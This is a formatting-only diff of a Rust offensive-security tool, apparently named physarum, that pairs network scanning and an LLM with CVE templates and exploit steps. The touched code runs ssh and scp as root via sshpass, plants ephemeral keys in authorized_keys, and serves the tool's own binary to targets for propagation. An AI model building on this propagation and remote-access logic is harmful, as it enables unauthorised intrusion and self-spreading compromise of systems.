@@ -25,8 +25,7 @@ use physarum_llm::{
 };
 use physarum_scanner::{
     effective_stimulus_ports, result_from_open_port, EvidenceSource as ScanEvidenceSource,
-    NextProbeHint, OsHintSource as ScanOsHintSource, PortList, Scanner, SchemeHint,
-    SensingProfile,
+    NextProbeHint, OsHintSource as ScanOsHintSource, PortList, Scanner, SchemeHint, SensingProfile,
 };
 use physarum_sporangium::{PatternFinding, PatternRunner, RunPolicy, SeverityHint};
 
@@ -871,7 +870,7 @@ async fn enrich_with_patterns(
     selected_ids: &[String],
 ) -> Vec<PatternFinding> {
     let mut web_results: Vec<(u16, Option<String>)> = Vec::new(); // (port, scheme_str)
-    let mut non_web_results: Vec<u16> = Vec::new();               // ConfirmedNonWeb ports (FTP, SMTP, …)
+    let mut non_web_results: Vec<u16> = Vec::new(); // ConfirmedNonWeb ports (FTP, SMTP, …)
 
     for r in sensing_results {
         match resolve_classification(r, target).await {
@@ -1227,7 +1226,11 @@ async fn execute_step(
             match timeout(Duration::from_millis(timeout_ms), req.send()).await {
                 Ok(Ok(r)) => {
                     if r.status().is_success() || *accept_any_response {
-                        tracing::info!(status = r.status().as_u16(), accept_any = accept_any_response, "HTTP POST completed");
+                        tracing::info!(
+                            status = r.status().as_u16(),
+                            accept_any = accept_any_response,
+                            "HTTP POST completed"
+                        );
                         StepResult::Ok
                     } else {
                         StepResult::Failed(format!("HTTP {}", r.status()))
@@ -1263,7 +1266,8 @@ async fn execute_step(
                     .unwrap_or(false)
             } else {
                 Command::new("sshpass")
-                    .arg("-p").arg("")
+                    .arg("-p")
+                    .arg("")
                     .arg("ssh")
                     .args(&args)
                     .status()
@@ -1272,10 +1276,18 @@ async fn execute_step(
                     .unwrap_or(false)
             };
 
-            if ok { StepResult::Ok } else { StepResult::Failed("ssh command failed".into()) }
+            if ok {
+                StepResult::Ok
+            } else {
+                StepResult::Failed("ssh command failed".into())
+            }
         }
 
-        BootstrapAction::ScpUpload { local_path, remote_path, user } => {
+        BootstrapAction::ScpUpload {
+            local_path,
+            remote_path,
+            user,
+        } => {
             let actual_local = resolve_local_path(local_path);
             let remote_user = user.as_deref().unwrap_or("root");
             tracing::info!(
@@ -1297,7 +1309,8 @@ async fn execute_step(
                     .unwrap_or(false)
             } else {
                 Command::new("sshpass")
-                    .arg("-p").arg("")
+                    .arg("-p")
+                    .arg("")
                     .arg("scp")
                     .args(&scp_args)
                     .status()
@@ -1306,7 +1319,11 @@ async fn execute_step(
                     .unwrap_or(false)
             };
 
-            if ok { StepResult::Ok } else { StepResult::Failed("scp upload failed".into()) }
+            if ok {
+                StepResult::Ok
+            } else {
+                StepResult::Failed("scp upload failed".into())
+            }
         }
 
         BootstrapAction::ScpPullFromSource {
@@ -1396,11 +1413,17 @@ async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey> {
 
     let status = Command::new("ssh-keygen")
         .args([
-            "-t", "ed25519",
-            "-f", privkey_path.to_str().unwrap_or("/tmp/physarum/ephemeral_key"),
-            "-N", "",                   // empty passphrase
-            "-C", "physarum-ephemeral", // comment — identifies the key in authorized_keys
-            "-q",                       // quiet
+            "-t",
+            "ed25519",
+            "-f",
+            privkey_path
+                .to_str()
+                .unwrap_or("/tmp/physarum/ephemeral_key"),
+            "-N",
+            "", // empty passphrase
+            "-C",
+            "physarum-ephemeral", // comment — identifies the key in authorized_keys
+            "-q",                 // quiet
         ])
         .status()
         .await?;
@@ -1435,8 +1458,10 @@ fn build_template_catalog_for_llm(
         .iter()
         .filter(|t| t.id.starts_with("CVE-"))
         .collect();
-    let mut rest: Vec<&physarum_sporangium::PatternTemplate> =
-        templates.iter().filter(|t| !t.id.starts_with("CVE-")).collect();
+    let mut rest: Vec<&physarum_sporangium::PatternTemplate> = templates
+        .iter()
+        .filter(|t| !t.id.starts_with("CVE-"))
+        .collect();
 
     cve_first.sort_by(|a, b| a.id.cmp(&b.id));
     rest.sort_by(|a, b| a.id.cmp(&b.id));
@@ -1463,9 +1488,7 @@ fn build_template_catalog_for_llm(
 /// Returns the `JoinHandle` so the caller can shut it down after propagation.
 /// The server is already non-blocking: it listens in the background and the
 /// returned handle can be aborted when the exploit step completes.
-async fn start_binary_server(
-    local_ip: Ipv4Addr,
-) -> Option<tokio::task::JoinHandle<()>> {
+async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHandle<()>> {
     use tokio::net::TcpListener;
 
     let binary_path = std::env::current_exe().ok()?;
@@ -1508,7 +1531,9 @@ async fn start_binary_server(
                     }
                     Err(e) => {
                         tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
-                        let _ = socket.write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n").await;
+                        let _ = socket
+                            .write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n")
+                            .await;
                     }
                 }
             });
